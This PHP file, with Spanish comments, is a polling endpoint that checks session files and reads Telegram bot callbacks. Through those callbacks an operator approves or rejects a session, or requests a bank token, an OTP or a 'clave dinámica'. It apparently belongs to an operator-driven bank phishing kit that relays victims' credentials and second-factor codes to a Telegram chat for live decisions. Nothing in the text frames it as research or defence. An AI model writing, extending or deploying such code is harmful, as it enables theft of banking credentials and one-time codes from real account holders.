<?php
/**
 * ================================================================
 * API Poll — Consulta estado de aprobación
 * ================================================================
 * Lee el archivo de sesión local. Si es necesario, también
 * procesa updates de Telegram (evita múltiples llamadas getUpdates).
 */

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];

$sessionId = $_GET['sessionId'] ?? ($_POST['sessionId'] ?? '');
if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9]+$/', $sessionId)) {
    echo json_encode(['ok' => false, 'error' => 'sessionId inválido']);
    exit;
}

$sessionFile = __DIR__ . "/../data/{$sessionId}.json";
if (!file_exists($sessionFile)) {
    echo json_encode(['ok' => false, 'error' => 'Sesión no encontrada']);
    exit;
}

// ── Leer sesión ──
$session = json_decode(file_get_contents($sessionFile), true) ?: [];

// ── Si ya tiene acción, devolver directamente ──
if (($session['status'] ?? '') !== 'pending') {
    echo json_encode([
        'ok'     => true,
        'status' => $session['status'],
        'action' => $session['action'] ?? null,
        'step'   => $session['step'] ?? null
    ]);
    exit;
}

// ── Procesar updates de Telegram si es necesario ──
// Usamos un lock global para evitar que múltiples usuarios llamen
// getUpdates al mismo tiempo (rate limit + race conditions)
$globalLockFile = __DIR__ . '/../data/.telegram.lock';
$globalOffsetFile = __DIR__ . '/../data/.telegram.offset';
$lastProcessed = @file_get_contents($globalLockFile) ?: 0;

// Si pasaron más de 4 segundos desde el último procesamiento, procesar ahora
if ((time() - (int)$lastProcessed) > 4) {
    @file_put_contents($globalLockFile, (string)time(), LOCK_EX);
    processTelegramUpdates($botToken, $chatId, $globalOffsetFile);
}

// ── Releer sesión (pudo haber sido actualizada por el procesamiento) ──
$session = json_decode(file_get_contents($sessionFile), true) ?: [];

echo json_encode([
    'ok'     => true,
    'status' => ($session['status'] ?? '') === 'completed' ? 'completed' : 'pending',
    'action' => $session['action'] ?? null,
    'step'   => $session['step'] ?? null
]);
exit;

// ────────────────────────────────────────────
// Función: Procesar todos los updates de Telegram
// ────────────────────────────────────────────
function processTelegramUpdates($botToken, $chatId, $offsetFile) {
    $lastUpdateId = (int)@file_get_contents($offsetFile);
    $url = "https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($lastUpdateId + 1) . "&limit=100";

    $tgResponse = @file_get_contents($url);
    if ($tgResponse === false) return;

    $tgData = json_decode($tgResponse, true);
    if (!$tgData['ok'] || empty($tgData['result'])) return;

    $maxUpdateId = $lastUpdateId;

    foreach ($tgData['result'] as $update) {
        $updateId = $update['update_id'];
        if ($updateId > $maxUpdateId) $maxUpdateId = $updateId;

        if (!isset($update['callback_query'])) continue;

        $cb = $update['callback_query'];
        $cbData = $cb['data'] ?? '';
        $cbqId  = $cb['id'] ?? '';

        // Parsear: accion_step_sessionId
        if (!preg_match('/^(\w+)_(\w+)_(sess_[a-zA-Z0-9]+)$/', $cbData, $m)) continue;

        $action = $m[1];
        $step   = $m[2];
        $sessId = $m[3];

        // Responder callback inmediatamente
        if ($cbqId) {
            @file_get_contents("https://api.telegram.org/bot{$botToken}/answerCallbackQuery?callback_query_id={$cbqId}");
        }

        // Actualizar sesión correspondiente
        $sessFile = __DIR__ . "/../data/{$sessId}.json";
        if (!file_exists($sessFile)) continue;

        $sessFp = fopen($sessFile, 'r+');
        if (!$sessFp || !flock($sessFp, LOCK_EX)) continue;

        $sessContent = stream_get_contents($sessFp);
        $sessData = json_decode($sessContent, true) ?: [];

        // Solo si está pendiente Y el paso coincide
        if (($sessData['status'] ?? '') === 'pending' && $step === ($sessData['currentStep'] ?? '')) {
            $sessData['status'] = 'completed';
            $sessData['action'] = $action;

            // Actualizar mensaje en Telegram
            $msgId = $sessData['messageId'] ?? null;
            if ($msgId) {
                $actionLabels = [
                    'aprobar'  => '✅ Aceptado',
                    'rechazar' => '❌ Rechazado',
                    'token'    => '🏦 Token solicitado',
                    'otp'      => '🔐 OTP solicitado',
                    'dinamica' => '💳 Clave dinámica solicitada'
                ];
                $actionText = $actionLabels[$action] ?? 'Acción realizada';
                $originalText = $sessData['messageText'] ?? '';
                $newText = preg_replace('/\n\n⏳ Esperando acción del administrador\.\.\./', "\n\n<b>{$actionText}</b>", $originalText);

                $editBody = http_build_query([
                    'chat_id'      => $chatId,
                    'message_id'   => $msgId,
                    'text'         => $newText,
                    'parse_mode'   => 'HTML',
                    'reply_markup' => json_encode(['inline_keyboard' => []])
                ]);

                $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
                curl_setopt_array($ch, [
                    CURLOPT_POST           => true,
                    CURLOPT_POSTFIELDS     => $editBody,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT        => 10,
                    CURLOPT_SSL_VERIFYPEER => true
                ]);
                curl_exec($ch);
                curl_close($ch);
            }

            ftruncate($sessFp, 0);
            rewind($sessFp);
            fwrite($sessFp, json_encode($sessData));
            fflush($sessFp);
        }

        flock($sessFp, LOCK_UN);
        fclose($sessFp);
    }

    // Guardar offset global
    @file_put_contents($offsetFile, (string)$maxUpdateId, LOCK_EX);
}
